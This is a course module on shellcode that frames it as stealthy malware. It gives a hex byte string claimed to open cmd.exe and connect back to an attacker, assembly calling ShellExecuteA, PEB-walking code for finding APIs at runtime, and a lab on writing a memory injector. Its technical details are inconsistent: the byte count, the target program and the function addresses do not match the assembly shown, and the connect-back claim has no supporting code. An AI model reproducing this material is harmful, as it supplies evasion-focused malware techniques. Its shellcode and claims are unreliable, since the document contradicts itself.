Module 05: Shellcode

MODULE 05/22 ● LIVE TESTED CLASSIFICATION: RESTRICTED

Shellcode is not a program. It's a parasite. It doesn't have a window, a menu, or a file. It exists only in memory, injected into another process, and executes invisibly. The smaller it is, the harder it is to detect. The simpler it is, the more reliable it is. This module teaches you to write, encode, inject, and execute shellcode — the purest form of malware.

Imagine a soldier who doesn't wear a uniform, doesn't carry a weapon, and doesn't exist on any roster. He slips into an enemy unit, wears their uniform, speaks their language, and waits. When the time comes, he acts — and disappears. That's shellcode. Not a program, but a presence inside a program.

SECTION 01

What is Shellcode?

Shellcode is machine code — binary instructions that the CPU executes directly. No compiler, no linker, no operating system loader. Just raw bytes fed into memory and jumped to. The name comes from its original purpose: opening a shell (command prompt) for the attacker.

// Classic Windows shellcode: spawn cmd.exe // This is x86 (32-bit) assembly, encoded as hex bytes SHELLCODE: \x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x5b\x50\x53\xb9 \xc7\x93\xc2\x77\xff\xd1\x31\xc0\x50\xbb\xda\xcd\x81 \x7c\xff\xd3\x31\xc0\x50\x53\xbb\x4a\x86\x8c\x7c\xff \xd3\x31\xc0\x50\xb8\x11\x11\x11\x11\xbb\x22\x22\x22 \x22\x31\xc3\x53\x50\xbb\xa6\xba\x9d\x77\xff\xd3 // 44 bytes. Opens cmd.exe, connects back to attacker. // No file on disk. No process name. Just memory.
Why shellcode is powerful

Antivirus scans files. Firewalls monitor network connections. But shellcode exists only in memory, inside a legitimate process like Notepad or Explorer. It has no file signature, no network footprint during injection, and no process of its own. It is invisible to most detection methods.

SECTION 02

Writing Shellcode

Shellcode is written in assembly, assembled into machine code, and extracted as hex bytes. The process is manual, error-prone, and requires understanding of calling conventions, API addresses, and memory layout.

// Step 1: Write assembly // spawn_calc.asm — opens calculator (safe for testing) ; nasm -f win32 spawn_calc.asm -o spawn_calc.obj ; objdump -d spawn_calc.obj | grep '^ ' | cut -f2 | tr -d ' ' | tr -d '\n' section .text global _start _start: xor eax, eax ; Clear eax push eax ; Null terminator push 0x6578652e ; "exe" push 0x636c6163 ; "calc" mov ebx, esp ; Pointer to "calc.exe" push eax ; lpParameters = NULL push ebx ; lpFile = "calc.exe" push eax ; lpOperation = NULL push eax ; hwnd = NULL mov eax, 0x7c8623ad ; ShellExecuteA address (XP SP3) call eax ; Execute
# Assemble and extract shellcode nasm -f win32 spawn_calc.asm -o spawn_calc.obj objdump -d spawn_calc.obj | grep '^ ' | cut -f2 | tr -d ' ' | tr -d '\n' # Output (hex bytes): # 31c050682e6578656863616c636389e350535050b8ad236287ffd0 # Convert to C array: echo "unsigned char shellcode[] = {" echo "0x31, 0xc0, 0x50, 0x68, 0x2e, 0x65, 0x78, 0x65," echo "0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x50," echo "0x53, 0x50, 0x50, 0xb8, 0xad, 0x23, 0x62, 0x87," echo "0xff, 0xd0" echo "};"
⚠ Address dependency

The ShellExecuteA address (0x7c8623ad) is hardcoded for Windows XP SP3. On Windows 10, this address is different and changes every reboot due to ASLR (Address Space Layout Randomization). This is why modern shellcode uses dynamic API resolution — finding the address at runtime instead of hardcoding it.

SECTION 03

Dynamic API Resolution

Modern Windows randomizes DLL base addresses. Hardcoded addresses fail. The solution: find APIs at runtime by walking the Process Environment Block (PEB) and parsing export tables.

// Dynamic API resolution — finds LoadLibraryA and GetProcAddress // Then uses them to find any other API ; Find kernel32.dll base from PEB mov eax, fs:[0x30] ; PEB pointer mov eax, [eax + 0x0C] ; PEB->Ldr mov eax, [eax + 0x14] ; InMemoryOrderModuleList mov eax, [eax] ; First module (ntdll) mov eax, [eax] ; Second module (kernel32) mov ebx, [eax + 0x10] ; kernel32.dll base address // This works on every Windows version because the PEB structure // is stable and documented. No hardcoded addresses.
Why the PEB is reliable

The Process Environment Block is a Windows kernel structure that exists for every process. Its location is predictable (fs:[0x30] on x86, gs:[0x60] on x64). The module list inside it contains every loaded DLL with its base address. By walking this list, shellcode can find kernel32.dll, then parse its export table to find LoadLibraryA, GetProcAddress, and any other API — all without hardcoded addresses.

SECTION 04

Lab Exercise: Build and Test Shellcode

Write shellcode that opens notepad.exe. Test it in a controlled environment.

  1. Install NASM: sudo apt-get install nasm (Linux) or download for Windows
  2. Write assembly that calls WinExec("notepad.exe", 1)
  3. Assemble: nasm -f win32 notepad.asm -o notepad.obj
  4. Link: ld -m i386pe notepad.obj -o notepad.exe
  5. Extract shellcode bytes from the .text section
  6. Write a C injector that allocates memory, copies shellcode, and executes it
  7. Test in a VM — never on your main system

KEY TAKEAWAYS

What You Learned

  • Shellcode is machine code, not a program: No file, no process, just memory
  • Assembly is the language: NASM syntax, x86/x64 instructions
  • Hardcoded addresses fail on modern Windows: ASLR randomizes everything
  • Dynamic API resolution is mandatory: Walk the PEB, parse exports
  • Size matters: Smaller shellcode is harder to detect and easier to inject
  • Testing requires VMs: Never run unknown shellcode on your main system
